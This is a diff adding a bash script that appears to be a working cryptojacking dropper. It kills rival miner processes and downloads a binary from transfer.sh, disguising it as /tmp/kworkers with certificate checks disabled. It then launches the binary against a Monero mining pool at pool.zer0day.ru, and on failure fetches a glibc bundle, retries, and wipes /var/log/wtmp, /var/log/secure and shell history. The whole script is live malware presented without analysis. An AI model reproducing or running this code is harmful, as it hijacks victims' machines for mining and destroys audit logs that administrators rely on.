@@ -1,0 +1,34 @@
+#!/bin/bash
+ps -ef | grep crypto-pool | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep nanopool | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep supportxmr | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep minexmr | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep dwarfpool | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep xmrpool | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep moneropool | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep monero | grep -v grep | awk '{print $2}' | xargs kill -9
+ps -ef | grep udevs | grep -v grep | awk '{print $2}' | xargs kill -9
+yum install wget -y
+apt-get install wget -y
+PS2=$(ps aux | grep kworkers | grep -v "grep" | wc -l)
+if [ $PS2 -eq 0 ];
+then
+rm -rf /tmp/kworkers*
+wget https://transfer.sh/MUMjG/nodexx --no-check-certificate -O /tmp/kworkers
+fi
+if [[ $? -ne 0 && $PS2 -eq 0 ]];
+then
+curl -sk https://transfer.sh/MUMjG/nodexx -o /tmp/kworkers
+fi
+chmod +x /tmp/kworkers
+chmod 777 /tmp/kworkers
+if [ $PS2 -eq 0 ];
+then
+/tmp/kworkers -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld --safe -B
+fi
+if [[ $? -ne 0 && $PS2 -eq 0 ]];
+then
+echo $?
+wget https://transfer.sh/taOAv/glibc-2.14.tar.gz --no-check-certificate -O /tmp/glibc-2.14.tar.gz && tar zxvf /tmp/glibc-2.14.tar.gz -C /tmp/ && export LD_LIBRARY_PATH=/tmp/opt/glibc-2.14/lib:$LD_LIBRARY_PATH && /tmp/kworkers -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld  --safe -B && echo "" > /var/log/wtmp && echo "" > /var/log/secure && history -c
+fi
